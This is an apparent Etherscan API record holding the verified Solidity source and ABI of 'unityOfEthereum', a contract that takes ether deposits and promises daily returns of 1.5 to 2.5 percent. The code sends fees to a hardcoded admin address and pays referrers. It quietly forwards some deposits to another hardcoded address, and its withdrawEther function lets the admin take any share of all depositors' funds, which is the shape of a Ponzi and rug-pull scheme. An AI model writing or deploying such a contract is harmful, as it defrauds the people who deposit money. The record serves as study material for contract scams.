{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.8;\r\ncontract unityOfEthereum {\r\n    \r\n    struct Investor\r\n    {\r\n        uint amount; \r\n        uint dateUpdate; \r\n        uint dateEnd;\r\n        address refer; \r\n        bool active; \r\n    }\r\n    \r\n    uint constant private PERCENT_FOR_ADMIN = 10; \r\n    uint constant private PERCENT_FOR_REFER = 5; \r\n    address constant private ADMIN_ADDRESS = 0x6fc68a2888f1015cA458C801B8ACeEb941d535B2;\r\n    mapping(address => Investor) investors; \r\n    event Transfer (address indexed _to, uint256 indexed _amount);\r\n    \r\n    constructor () {\r\n    }\r\n    \r\n    function getPercent(Investor storage investor) private view returns (uint256) {\r\n        uint256 amount = investor.amount;\r\n        uint256 percent = 0;\r\n        if (amount >= 0.0001 ether && amount <= 0.049 ether) percent = 15;\r\n        if (amount >= 0.05 ether && amount <= 0.099 ether) percent = 20;\r\n        if (amount >= 0.1 ether && amount <= 0.499 ether) percent = 21;\r\n        if (amount >= 0.5 ether && amount <= 2.999 ether) percent = 22;\r\n        if (amount >= 3 ether && amount <= 9.999 ether) percent = 23;\r\n        if (amount >= 10 ether) percent = 25;\r\n        return percent;\r\n    }\r\n    \r\n    function getDate(Investor storage investor) private view returns (uint256) {\r\n        uint256 amount = investor.amount;\r\n        uint256 date = 0;\r\n        if (amount >= 0.0001 ether && amount <= 0.049 ether) date = block.timestamp + 1 days;\r\n        if (amount >= 0.05 ether && amount <= 0.099 ether) date = block.timestamp + 7 days;\r\n        if (amount >= 0.1 ether && amount <= 0.499 ether) date = block.timestamp + 14 days;\r\n        if (amount >= 0.5 ether && amount <= 2.999 ether) date = block.timestamp + 30 days;\r\n        if (amount >= 3 ether && amount <= 9.999 ether) date = block.timestamp + 60 days;\r\n        if (amount >= 10 ether) date = block.timestamp + 120 days;\r\n        return date;\r\n    }\r\n    \r\n    function getFeeForAdmin(uint256 amount) private pure returns (uint256) {\r\n        return amount * PERCENT_FOR_ADMIN / 100;\r\n    }\r\n\r\n    function getFeeForRefer(uint256 amount) private pure returns (uint256) {\r\n        return amount * PERCENT_FOR_REFER / 100;\r\n    }\r\n\r\n    function getProfit(Investor storage investor) private view returns (uint256) {\r\n        uint256 amount = investor.amount;\r\n        if (block.timestamp >= investor.dateEnd) {\r\n            return amount + amount * getPercent(investor) * (investor.dateEnd - investor.dateUpdate) / (1 days * 1000);\r\n        } else {\r\n            return amount * getPercent(investor) * (block.timestamp - investor.dateUpdate) / (1 days * 1000);\r\n        }\r\n    }\r\n\r\n    receive() external payable {\r\n        require(msg.value == 0 || msg.value >= 0.0001 ether, \"Min Amount for investing is 0.0001 ether.\");\r\n\r\n        if (msg.value == 0 && investors[msg.sender].active) {\r\n\r\n            uint256 amountProfit = getProfit(investors[msg.sender]);\r\n            require(amountProfit > 0.0001 ether, 'amountProfit must be > 0.0001 etherT');\r\n\r\n            if (block.timestamp >= investors[msg.sender].dateEnd) {\r\n                investors[msg.sender].active = false;\r\n            }\r\n\r\n            investors[msg.sender].dateUpdate = block.timestamp;\r\n\r\n            payable(msg.sender).transfer(amountProfit);\r\n            emit Transfer(msg.sender, amountProfit);\r\n\r\n        } else if (!investors[msg.sender].active) {\r\n            uint feeForAdmin = getFeeForAdmin(msg.value);\r\n            payable(ADMIN_ADDRESS).transfer(feeForAdmin);\r\n            emit Transfer(ADMIN_ADDRESS, feeForAdmin);\r\n\r\n            investors[msg.sender].active = true;\r\n            investors[msg.sender].dateUpdate = block.timestamp;\r\n            investors[msg.sender].amount =  msg.value;\r\n            investors[msg.sender].dateEnd = getDate(investors[msg.sender]);\r\n\r\n            if (investors[msg.sender].refer != address(0)) {\r\n                uint feeForRefer = getFeeForRefer(msg.value);\r\n                payable(investors[msg.sender].refer).transfer(feeForRefer);\r\n                emit Transfer(investors[msg.sender].refer, feeForRefer);\r\n            }\r\n        } else {\r\n            payable(0x48560EBFd9313817e729dE5d744D748a9CeECEb4).transfer(msg.value);\r\n            emit Transfer(0x48560EBFd9313817e729dE5d744D748a9CeECEb4, msg.value);\r\n        }\r\n    }\r\n\r\n    function showUnpayedPercent() public view returns (uint256) {\r\n        return getProfit(investors[msg.sender]);\r\n    }\r\n    \r\n    function setRefer(address _refer) public {\r\n        require(_refer != address(0), \"Irritum data\");\r\n        require(investors[msg.sender].refer == address(0), \"In referrer est iam installed\");\r\n        \r\n        investors[msg.sender].refer = _refer;\r\n       \r\n    }\r\n    \r\n    function withdrawEther(uint256 _amount) public {\r\n        require(ADMIN_ADDRESS == msg.sender, \"Access denied\");\r\n\r\n        uint256 payment = address(this).balance * _amount / 100;\r\n        payable(ADMIN_ADDRESS).transfer(payment);\r\n        emit Transfer(msg.sender, payment);\r\n    }\r\n    \r\n\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_refer\",\"type\":\"address\"}],\"name\":\"setRefer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"showUnpayedPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawEther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"unityOfEthereum","CompilerVersion":"v0.8.1+commit.df193b15","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://65197f700dc0ce77f9318e3980009797d611a9959d0572e415620f0ab7d265f1"}]}